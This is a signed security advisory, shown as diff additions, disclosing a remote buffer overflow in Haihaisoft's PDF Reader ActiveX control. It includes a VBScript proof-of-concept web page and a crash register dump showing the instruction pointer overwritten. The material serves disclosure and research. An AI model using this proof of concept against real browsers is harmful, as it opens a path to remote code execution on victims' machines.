@@ -1,0 +1,116 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+==================================================================================
+==================================================================================
+ Haihaisoft PDF Reader OCX Control Remote Buffer Overflow
+ url: http://www.haihaisoft.com/
+==================================================================================
+==================================================================================
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.altervista.org/
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on:
+ Windows XP Professional SP3 full patched, Internet Explorer 8
+ Windows 2k Professional SP4 full patched, Internet Explorer 6
+==================================================================================
+==================================================================================
+ File name:	PDFReaderOCX.ocx
+ Version:	1.1.2.0
+ ProgID:	PDFReaderOCX.PDFReaderOCXCtrl.1
+ GUID:		{28CB49D6-E530-442B-A182-79F047C3AA1B}
+ Descr.:	PDFReaderOCX Control
+ 
+ Marked as:	RegKey Safe for Script: True
+		RegKey Safe for Init: True
+		Implements IObjectSafety: False
+==================================================================================
+==================================================================================
+ This control contains 19 members, as follow:
+
+ Members: 19
+	    URL
+	    Language
+	    UnicodeURL
+	    ZoomOutput
+	    ViewOutput
+	    View_ContinuousOutput
+	    UpdateURL
+	    DownloadURL
+	    m_ViewDir
+	    RequiredVersion
+	    Zoom
+	    View
+	    Rotate
+	    GoTo
+	    Open
+	    Close
+	    UILanguage
+	    Print
+	    DRMRights
+
+ Particularly this one "URL" results vulnerable to a buffer overflow if you
+ pass an overly long string (more than 2048 bytes) as filename and browse to
+ the crafted web page (e.g. http://www.SomeSite.com/File.pdf) and then
+ refresh the page.
+==================================================================================
+==================================================================================
+ Proof of concept:
+
+ <object classid='clsid:28CB49D6-E530-442B-A182-79F047C3AA1B' id='test'></object>
+
+ <script language="vbscript">
+  buff = "AAAAAAAAAAAAAAABBBB" + String(2011, "C")
+  test.URL = buff
+
+  Function tryMe()
+   document.location.reload
+  End Function
+
+  Sub Window_OnLoad
+   setTimeout "tryMe()",2000
+  End Sub
+ </script>
+==================================================================================
+==================================================================================
+ Registers:
+
+ 17:07:08.406  pid=0410 tid=02DC  EXCEPTION (first-chance)
+               ----------------------------------------------------------------
+               Exception C0000005 (ACCESS_VIOLATION reading [42424242])
+               ----------------------------------------------------------------
+               EAX=0275CD80: 20 82 75 02 78 5E 75 02-41 41 41 41 41 41 41 41
+               EBX=0275B978: CC 09 6B 02 00 00 00 00-00 00 00 00 98 B4 75 02
+               ECX=02755E78: 80 CD 75 02 C0 BA 75 02-00 00 00 00 58 64 3D 02
+               EDX=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+               ESP=0297C5B0: 9F 9D 28 02 F0 A1 75 02-C4 C5 97 02 25 5C 29 02
+               EBP=0297FFB4: EC FF 97 02 BC B3 6B 79-78 5E 75 02 80 DF 12 00
+               ESI=0275BAC0: 78 5E 75 02 78 01 75 02-00 08 00 00 00 00 00 00
+               EDI=0275A1F0: BC 09 6B 02 00 00 00 00-00 00 00 00 0C A2 75 02
+               EIP=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                             --> N/A
+               ----------------------------------------------------------------
+==================================================================================
+==================================================================================
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.10 (MingW32)
+
+iQIcBAEBAgAGBQJMQDW4AAoJELleC2c7YdP1cg4P/jD0oq/osKQYYt1xfXCei9Ag
+rkSyP9D91IwiTW5VQqnEfeDDBRsHAa7Y2xm7O7ZK5tkj1cTKnijyiSOHBum/V94v
+oA9UGWJDzk2ztjHlUvHA2zrF9uxFxGQRxI+TgJlS9PgGvw3BYDT0ZwemniRY6wtS
+PMbxiDRKGESPG6xCDCP1XLWUqdEUmlNchkzG1s6dqEbTfYmPcJTP/ffWS7glcJya
+3eDoXIGqESBHMtRUKr8JFlEeI/ZpfZ83g5EiomP0KQoQreBBbdx1mER0EpCfgNuo
+uBUwnZtkD5LA9kFL0mrnG4SC6KEw7s2gWKXwiXesZ8JI8Fuy/nvGy2na+yksTd/h
+PQpMwtvR8eX1A3z4BZUV4OhgJB8oweAyI0TJUBi3F8VgDDGGDVcrR57HU8gX3S8T
+Ft5j/xbO2qqCGb9hlgAhV1fQAa+HxXKtrPLp2arsnFCkLU4RINyH3TKK07pT3GSG
+009qBpYL//hvV7pwv+pvYfrcZSrDf1yyU3cirVjSAkG23CdicHw7+woj9LgTMNR6
+e4wys8kziNfCUVcfseTGWGAVKELxZyJvNhKz8Y6pXg7oSuz41bhf+uozjl/beBPz
+jOKy6mfUCW2PogRvVOj8j/zkiseDtM3UjMazYuaBUmO8DNl8gpLFL007MN5dbLHM
+QAGnwRHZypdNlz79bX/+
+=kM0M
+-----END PGP SIGNATURE-----
